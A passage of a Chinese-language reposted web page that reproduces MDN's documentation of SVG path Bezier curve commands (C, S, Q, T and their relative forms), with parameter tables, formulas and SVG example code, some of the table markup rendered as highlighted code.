class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
</code></pre>
</td></tr></tbody></table>
<p>示例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>
  <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 200 100"</span>
  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>
  <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 使用绝对坐标的三次贝塞尔曲线 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 10,90
           C 30,90 25,10 50,10
           S 70,90 90,90"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- 使用相对坐标的三次贝塞尔曲线 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 110,90
           c 20,0 15,-80 40,-80
           s 20,80 40,80"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- 高亮显示曲线顶点和控制点 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">g</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"ControlPoints"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 第一段三次贝塞尔曲线的控制点 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">line</span> <span class="hljs-attr">x1</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">y1</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">x2</span>=<span class="hljs-string">"30"</span> <span class="hljs-attr">y2</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"30"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">line</span> <span class="hljs-attr">x1</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">y1</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">x2</span>=<span class="hljs-string">"25"</span> <span class="hljs-attr">y2</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"25"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>

    <span class="hljs-comment">&lt;!-- 第二段平滑三次贝塞尔曲线的控制点（第一个是隐式的） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">line</span>
      <span class="hljs-attr">x1</span>=<span class="hljs-string">"50"</span>
      <span class="hljs-attr">y1</span>=<span class="hljs-string">"10"</span>
      <span class="hljs-attr">x2</span>=<span class="hljs-string">"75"</span>
      <span class="hljs-attr">y2</span>=<span class="hljs-string">"10"</span>
      <span class="hljs-attr">stroke</span>=<span class="hljs-string">"lightgrey"</span>
      <span class="hljs-attr">stroke-dasharray</span>=<span class="hljs-string">"2"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"75"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">line</span> <span class="hljs-attr">x1</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">y1</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">x2</span>=<span class="hljs-string">"70"</span> <span class="hljs-attr">y2</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"lightgrey"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"70"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>

    <span class="hljs-comment">&lt;!-- 曲线顶点 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"50"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">circle</span> <span class="hljs-attr">cx</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">cy</span>=<span class="hljs-string">"90"</span> <span class="hljs-attr">r</span>=<span class="hljs-string">"1.5"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">use</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"#ControlPoints"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"100"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre>
<p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/98ce867a36a444d6b8b3d38ce4a57879~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="1008" loading="lazy"/></p>
<h3 id="user-content-二次贝塞尔曲线" data-id="heading-2"><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="二次贝塞尔曲线" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E4%25BA%258C%25E6%25AC%25A1%25E8%25B4%259D%25E5%25A1%259E%25E5%25B0%2594%25E6%259B%25B2%25E7%25BA%25BF" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E4%BA%8C%E6%AC%A1%E8%B4%9D%E5%A1%9E%E5%B0%94%E6%9B%B2%E7%BA%BF" target="_blank" ref="nofollow noopener noreferrer">二次贝塞尔曲线</a></h3>
<p><em>二次</em><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="贝塞尔曲线" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FGlossary%2FBezier_curve" title="https://developer.mozilla.org/zh-CN/docs/Glossary/Bezier_curve" target="_blank" ref="nofollow noopener noreferrer">贝塞尔曲线</a>是使用三个点定义的平滑曲线：</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="起始点（当前位置）" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E8%25B5%25B7%25E5%25A7%258B%25E7%2582%25B9%25EF%25BC%2588%25E5%25BD%2593%25E5%2589%258D%25E4%25BD%258D%25E7%25BD%25AE%25EF%25BC%2589_2" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E8%B5%B7%E5%A7%8B%E7%82%B9%EF%BC%88%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%EF%BC%89_2" target="_blank" ref="nofollow noopener noreferrer">起始点（当前位置）</a></p>
<p><em>Po</em> = {<em>xo</em>, <em>yo</em>}</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="终点" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E7%25BB%2588%25E7%2582%25B9_2" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E7%BB%88%E7%82%B9_2" target="_blank" ref="nofollow noopener noreferrer">终点</a></p>
<p><em>Pn</em> = {<em>xn</em>, <em>yn</em>}</p>
<p><a data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8" data-link-title="控制点" href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSVG%2FReference%2FAttribute%2Fd%23%25E6%258E%25A7%25E5%2588%25B6%25E7%2582%25B9" title="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E6%8E%A7%E5%88%B6%E7%82%B9" target="_blank" ref="nofollow noopener noreferrer">控制点</a></p>
<p><em>Pc</em> = {<em>xc</em>, <em>yc</em>}（控制曲率）</p>
<p>绘制后，<em>终点</em>（<em>Pn</em>）将成为下一个命令中的<em>当前位置</em>（<em>Po′</em>）。</p>
<table>
	<tbody>
		<tr>
			<th scope="col">命令</th>
			<th scope="col">参数</th>
			<th scope="col">备注</th>
		</tr>
		<tr>
			<th scope="row">Q</th>
			<td>(<code>x1</code>,<code>y1</code>, <code>x</code>,<code>y</code>)+</td>
			<td>
			<p>在<em>当前位置</em>和<em>终点</em> <code>x</code>,<code>y</code> 之间绘制一条二次贝塞尔曲线。<em>控制点</em>通过 <code>x1</code>,<code>y1</code> 指定。后续成对的坐标序列将被解释为隐式的绝对位置的二次贝塞尔曲线（<code>Q</code>）命令的参数。</p>
<pre><code class="hljs language-xml" lang="xml">		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A_3"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pc<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>q<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处）之间绘制一条二次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>（曲线的起始点）沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处。后续成对的坐标序列将被解释为隐式的相对位置的二次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>q<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A_4"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>} ;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
		Pc<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy1<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>之间绘制一条平滑的二次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>是上一条曲线命令的<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>上的反射点；若上一条命令不是曲线命令，则其与曲线的起始点（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>）相同。后续的坐标序列将被解释为隐式的绝对位置的平滑二次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>T<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A_5"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">"row"</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>(<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>)+<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>终点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>为<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>沿 x 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>以及沿 y 轴偏移<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span>处）之间绘制一条平滑的二次贝塞尔曲线。<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>是上一条曲线命令的<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>控制点<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>在<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>上的反射点；若上一条命令不是曲线命令，则其与曲线的起始点（<span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>当前位置<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>）相同。后续的坐标序列将被解释为隐式的相对位置的平滑二次贝塞尔曲线（<span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>t<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>）命令的参数。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">data-link-icon</span>=<span class="hljs-string">"https://csdnimg.cn/release/blog_editor_html/release2.4.5/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=PBP8"</span> <span class="hljs-attr">data-link-title</span>=<span class="hljs-string">"公式："</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://developer.mozilla.org/zh-CN/docs/Web/SVG/Reference/Attribute/d#%E5%85%AC%E5%BC%8F%EF%BC%9A_6"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"公式："</span>&gt;</span>公式：<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

		<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Po<span class="hljs-symbol">&amp;prime;</span><span class="hljs-symbol">&amp;nbsp;</span>=<span class="hljs-symbol">&amp;nbsp;</span>Pn<span class="hljs-symbol">&amp;nbsp;</span>= {xo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dx<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>,<span class="hljs-symbol">&amp;nbsp;</span>yo<span class="hljs-symbol">&amp;nbsp;</span>+<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>dy<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
</code></pre>
</td></tr></tbody></table>
<p>示例</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>
  <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 200 100"</span>
  <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>
  <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 二次贝塞尔曲线，带有隐式重复 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
    <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>
    <span class="hljs-attr">stroke</span>=<span class="hljs-string">"red"</span>
    <span class="hljs-attr">d</span>=<span class="hljs-string">"M 10,50
           Q 25,25 40,50
           t 30,0 30,0 30,0 30,0 30,0"</span> /&gt;</span>

  <span class="hljs-comment">&lt;!-- 高亮显示曲线顶点和控制点 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">g</span>&gt;</span>
